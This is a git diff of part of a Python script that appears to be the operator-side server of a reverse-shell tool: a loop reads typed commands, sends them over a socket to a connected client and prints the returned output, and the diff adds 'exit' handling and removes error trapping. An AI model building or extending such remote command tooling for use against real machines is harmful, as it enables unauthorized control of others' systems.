@@ -29,9 +29,9 @@ banner = f"""
 """
 
 info = f"""
-    {white}[+] {dom}Info:
-    {white}[-] {dom}Developer: {magenta}{dev} 
-    {white}[-] {dom}Github: {azul}{github}
+{white}[+] {dom}Info:
+ {white}[-] {dom}Developer: {magenta}{dev} 
+ {white}[-] {dom}Github: {azul}{github}
 """
 
 class MainServer:
@@ -49,21 +49,25 @@ class MainServer:
         print(f" {white}[-] {dom}OS: {plat}\n")
         while True:
             command = input(f'{yellow}>{dom} ')
+            
+            if command == "exit":
+                client.send("stop".encode())
+                sys.exit(0)
+            elif command == "exit()":
+                client.send("stop".encode())
+                sys.exit(0)
+                
             client.send(command.encode())
             dato = client.recv(1024).decode()
             if dato.endswith("\n"):
                 dato = dato[:-1]
-            print(f"{dato}")
+            print(f"{white}{dato}")
             
         s.close()
 
 if __name__ == "__main__":
-    try:
-        print(banner+info)
-        MainServer().start()
-    except:
-        print(f"{red}[+] {yellow}error")
-        sys.exit(0)
+    print(banner+info)
+    MainServer().start()
 else:
     print("{red}[+] {yellow}Invalid method")
     sys.exit(0)
